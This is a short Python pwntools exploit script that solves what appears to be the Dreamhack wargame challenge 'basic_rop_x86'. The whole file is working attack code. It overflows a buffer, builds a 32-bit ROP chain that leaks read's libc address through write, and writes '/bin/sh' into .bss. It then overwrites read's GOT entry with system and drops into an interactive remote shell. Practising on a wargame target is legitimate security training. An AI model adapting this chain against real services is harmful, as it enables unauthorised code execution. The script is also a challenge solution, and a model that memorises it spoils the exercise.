from pwn import *
context.log_level = 'debug'
p = remote('host1.dreamhack.games', 21445)
libc = ELF("./libc.so.6")
e = ELF("./basic_rop_x86")

read_got = e.got['read']
write_plt = e.plt['write']
read_plt = e.plt['read']
read_offset = libc.symbols['read']
pppr = 0x8048689
bss = e.bss()
system_offset = libc.symbols['system']

payload = ''
payload += 'a'* 0x48
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(8)

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(read_got)
payload += p32(4)

payload += p32(read_plt)
payload += 'aaaa'
payload += p32(bss)

p.sendline(payload)
dummy = p.recv(0x40)
read_addr = u32(p.recv(4))
print hex(read_addr)
libc_base = read_addr - read_offset
system = libc_base + system_offset
#print hex(one_gadget)
p.sendline('/bin/sh')
p.sendline(p32(system))

p.interactive()




